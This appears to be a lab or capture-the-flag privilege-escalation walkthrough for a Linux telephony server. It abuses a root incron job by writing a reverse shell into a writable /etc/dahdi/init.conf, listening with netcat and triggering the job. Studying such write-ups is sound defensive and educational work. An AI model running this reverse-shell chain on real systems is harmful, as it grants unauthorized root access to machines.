
Incron (inotify cron) is a powerful system utility that, unlike the traditional cron, triggers commands based on file system events (like a file being created, modified, or deleted) rather than on a time schedule

---

1. Enumerate incron jobs

```
cat /etc/incron.d/*

/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
```

The output shows the tasks that the system has been configured to run automatically in response to specific file system changes.

The format is:

```
<watched_path> <event> <command_to_run>
```

All of these jobs run as root because they are defined in the system-wide directory /etc/incron.d/ (owned by root).

2. Analyze the script

Does it execute any binaries?

```
cat /usr/sbin/sysadmin_dahdi_restart
#!/bin/sh

/etc/init.d/asterisk stop

sleep 5

/etc/init.d/dahdi restart

sleep 5

export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
`which amportal` start
```

3. Analyze /etc/init.d/dahdi binary.

The source code revealed an /etc/dahdi/init.conf. Note all configuration files inside of there and store them and check if we have write permissions.

```
cat /etc/init.d/dahdi
```

OR Enumerate writable system configuration files

```
find /etc -writable 2>/dev/null
```

We have write permissions on /etc/dahdi/init.conf, so the chain is:

```
touch /var/spool/asterisk/sysadmin/dahdi_restart
  → incrond (root) fires sysadmin_dahdi_restart
    → /etc/init.d/dahdi restart (root)
      → sources /etc/dahdi/init.conf
        → our payload runs as root
```

3. The file /etc/dahdi/init.conf is writable by the current user, which means we can inject an reverse shell inside and trigger the incron job.

```
echo 'bash -i >& /dev/tcp/10.10.14.57/9002 0>&1' >> /etc/dahdi/init.conf
```

4. Start up netcat listener on local machine.

```
nc -lvnp 9002
```

5. Trigger the incron ruleset

```
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

OR 

```
echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart 
```

Gained RCE.
